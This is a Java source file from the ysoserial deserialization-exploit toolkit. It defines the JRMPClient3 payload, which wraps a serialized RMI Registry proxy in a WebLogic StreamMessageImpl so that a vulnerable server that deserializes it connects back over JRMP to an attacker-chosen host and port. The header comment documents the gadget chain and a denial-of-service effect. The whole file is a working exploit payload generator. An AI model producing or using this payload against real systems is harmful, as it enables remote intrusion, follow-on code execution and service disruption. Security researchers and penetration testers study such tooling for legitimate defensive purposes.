package ysoserial.payloads;


import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import weblogic.jms.common.StreamMessageImpl;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.PayloadRunner;

import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;


/**
 *
 *
 * UnicastRef.newCall(RemoteObject, Operation[], int, long)
 * DGCImpl_Stub.dirty(ObjID[], long, Lease)
 * DGCClient$EndpointEntry.makeDirtyCall(Set<RefEntry>, long)
 * DGCClient$EndpointEntry.registerRefs(List<LiveRef>)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 *
 * Thread.start()
 * DGCClient$EndpointEntry.<init>(Endpoint)
 * DGCClient$EndpointEntry.lookup(Endpoint)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 *
 * Requires:
 * - JavaSE
 *
 * Argument:
 * - host:port to connect to, host only chooses random port (DOS if repeated many times)
 *
 * Yields:
 * * an established JRMP connection to the endpoint (if reachable)
 * * a connected RMI Registry proxy
 * * one system thread per endpoint (DOS)
 *
 * @author mbechler
 */

@SuppressWarnings ( {
    "restriction"
} )
@Authors({ Authors.MBECHLER })

public class JRMPClient3 extends PayloadRunner implements ObjectPayload<Registry> {

    public Object streamMessageImpl(byte[] object) {
        StreamMessageImpl streamMessage = new StreamMessageImpl();
        streamMessage.setDataBuffer(object, object.length);
        return streamMessage;
    }

    public Registry getObject (final String command ) throws Exception {
        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID objID = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
        Object object = Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] { Registry.class }, remoteObjectInvocationHandler);
        return (Registry) streamMessageImpl(Serializer.serialize(object));
    }


    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
        PayloadRunner.run(JRMPClient3.class, args);
    }
}
